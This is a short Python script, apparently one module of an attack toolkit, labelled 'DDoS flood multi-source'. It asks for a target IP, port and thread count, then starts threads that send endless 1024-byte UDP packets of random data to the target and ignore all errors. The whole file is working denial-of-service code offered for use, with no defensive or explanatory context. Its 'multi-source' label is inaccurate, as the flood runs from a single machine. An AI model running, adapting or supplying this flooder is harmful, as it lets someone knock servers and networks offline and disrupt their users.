import os, sys, time, socket, random, threading

DESCRIPTION = "DDoS flood multi-source"

R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
N = "\033[0m"

def run():
    target = input(f"{Y}[?] Target IP: {N}")
    port = int(input(f"{Y}[?] Port: {N}"))
    threads = int(input(f"{Y}[?] Threads: {N}"))
    print(f"{G}[*] Starting DDoS on {target}:{port} with {threads} threads...{N}")
    
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect((target, port))
                data = random._urandom(1024)
                s.send(data)
            except:
                pass
    
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
    
    print(f"{R}[!] Attack running. Press Ctrl+C to stop.{N}")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{G}[*] Stopped.{N}")
